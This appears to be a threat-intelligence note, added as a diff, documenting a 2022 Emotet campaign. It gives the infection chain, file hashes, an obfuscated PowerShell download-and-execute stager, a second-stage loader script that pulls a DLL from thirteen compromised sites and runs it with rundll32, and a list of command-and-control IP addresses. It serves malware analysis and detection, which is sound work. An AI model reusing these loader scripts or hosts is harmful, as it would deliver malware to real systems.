@@ -1,3 +1,84 @@
 Emotet 2022
 
 ************************************************************************************************************
+
+Epoch5 - .zip > .xls > .hta > .ps > .dll
+
+.xls 2c1b69fb2c79fcc454029a08721e9ccf3a84aa29578846aec04c15799258caef
+
+.dll 0b838ceae1bd3e85e5d256519815ca6d103f56c30565cc707668af384c1b308d
+
+mshta  hxxp://91.240.118.172/ee/ss/se.html
+
+$c1 = "(New-Object Net.We"
+$c4 = "bClient).Downlo"
+$c3 = "adString('hxxp://91.240.118.172/ee/ss/se.png')"
+$ji = "(New-Object Net.WebClient).DownloadString('hxxp://91.240.118.172/ee/ss/se.png')"
+invoke-expression "(New-Object Net.WebClient).DownloadString('hxxp://91.240.118.172/ee/ss/se.png')"|invoke-expression
+
+.png
+
+$path = "C{Joo}:\{Joo}Prog{Joo}ramD{Joo}ata\M{Joo}ilossd.{Joo}dl{Joo}l".replace('{Joo}','');
+$url1 = 'hxxp://tamiladsense.com/wp-includes/BEADvqGgemV8SnTX/';
+$url2 = 'hxxp://manchesterheatingservices.youprocontact.com/wp-admin/AiK19uMf/';
+$url3 = 'hxxp://tunbridgeservices.com/jfoeqhxz/zOX0/';
+$url4 = 'hxxps://mypurealsystem.com/App_Start/Rhh8lKO/';
+$url5 = 'hxxp://imaginariumstore.fun/ncsb/cyGoTYqMmcRwvqdre/';
+$url6 = 'hxxp://engaz.shop/wp-content/MOllqUm2nb/';
+$url7 = 'hxxps://ecobaby.pi-dh.com/Serendib/gl1hcef9Y3GSTCDC/';
+$url8 = 'hxxp://3-fasen.com/wp-content/3Bl0hBbW/';
+$url9 = 'hxxps://vn.minino.com/wp-admin/c3WQa/';
+$url10 = 'hxxps://lastregaristorante.com/wp-admin/ffdC7ElM2Bn2/';
+$url11 = 'hxxp://onexone.elementor.cloud/cdrxhrt/uVE0uVHOz5E/';
+$url12 = 'hxxps://oculusvisioncare.com/wp-includes/ZEYDjosbNExFTdu/';
+$url13 = 'hxxp://devbhoomigaushala.org/Getae/Vyo5rrNLAgd0QxXvkv/';
+
+$web = New-Object net.webclient;
+$urls = "$url1,$url2,$url3,$url4,$url5,$url6,$url7,$url8,$url9,$url10,$url11,$url12,$url13".split(",");
+foreach ($url in $urls) {
+   try {
+       $web.DownloadFile($url, $path);
+       if ((Get-Item $path).Length -ge 30000) {
+           [Diagnostics.Process];
+           break;
+       }
+   }
+   catch{}
+} 
+Sleep -s 3;cmd /c C:\Windows\SysWow64\rundll32.exe 'C:\ProgramData\Milossd.dll',KitKat;
+
+C2's
+
+74.207.230.120:8080
+139.196.72.155:8080
+37.44.244.177:8080
+37.59.209.141:8080
+116.124.128.206:8080
+217.182.143.207:443
+54.37.228.122:443
+203.153.216.46:443
+168.197.250.14:80
+207.148.81.119:8080
+195.154.146.35:443
+78.46.73.125:443
+191.252.103.16:80
+210.57.209.142:8080
+185.168.130.138:443
+142.4.219.173:8080
+118.98.72.86:443
+78.47.204.80:443
+159.69.237.188:443
+190.90.233.66:443
+104.131.62.48:8080
+62.171.178.147:8080
+185.148.168.15:8080
+54.38.242.185:443
+198.199.98.78:8080
+194.9.172.107:8080
+85.214.67.203:8080
+66.42.57.149:443
+185.148.168.220:8080
+103.41.204.169:8080
+128.199.192.135:8080
+195.77.239.39:8080
+59.148.253.194:443
